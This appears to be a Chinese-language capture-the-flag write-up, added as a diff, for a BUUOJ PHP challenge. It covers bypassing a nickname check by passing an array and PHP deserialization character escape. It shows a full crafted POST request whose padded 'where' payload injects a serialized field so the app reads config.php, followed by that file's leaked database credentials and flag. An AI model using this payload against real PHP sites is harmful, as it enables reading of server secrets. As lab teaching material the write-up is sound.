@@ -1,0 +1,67 @@
+## 知识点：
+
+1. php反序列化字符逃逸
+2. 参数传递数组绕过字符串检测
+3. 源代码下载
+
+
+
+#参数传递数组绕过字符串检测
+
+```php
+if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+			die('Invalid nickname');
+
+nickname参数设置为数组nickname[] 上面过滤就没有用处了
+```
+
+#php反序列化字符逃逸
+
+";}s:5:"phone";s:10:"config.php";}
+
+post:
+
+```php
+POST /update.php HTTP/1.1
+Host: 24e688bf-6095-42b3-bd11-9b976e263587.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------1168357551517354723468063433
+Content-Length: 1085
+Origin: http://24e688bf-6095-42b3-bd11-9b976e263587.node4.buuoj.cn:81
+Connection: close
+Referer: http://24e688bf-6095-42b3-bd11-9b976e263587.node4.buuoj.cn:81/update.php
+Cookie: PHPSESSID=f4e12ec5c00804be375bd1c5a89d8781
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1168357551517354723468063433
+Content-Disposition: form-data; name="phone"
+
+18888888888
+-----------------------------1168357551517354723468063433
+Content-Disposition: form-data; name="email"
+
+aaaa@qq.caa
+-----------------------------1168357551517354723468063433
+Content-Disposition: form-data; name="nickname[]"
+
+wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+-----------------------------1168357551517354723468063433
+Content-Disposition: form-data; name="photo"; filename="å±å¹æªå¾ 2021-08-09 175453.png"
+Content-Type: image/png
+
+PNG
+
+```
+
+profile.php 查看图片的base64 然后解码 拿到flag
+
+<?php
+$config['hostname'] = '127.0.0.1';
+$config['username'] = 'root';
+$config['password'] = 'qwertyuiop';
+$config['database'] = 'challenges';
+$flag = 'flag{dd1de16e-7589-430f-9d0f-d1268de7264a}';
+?>
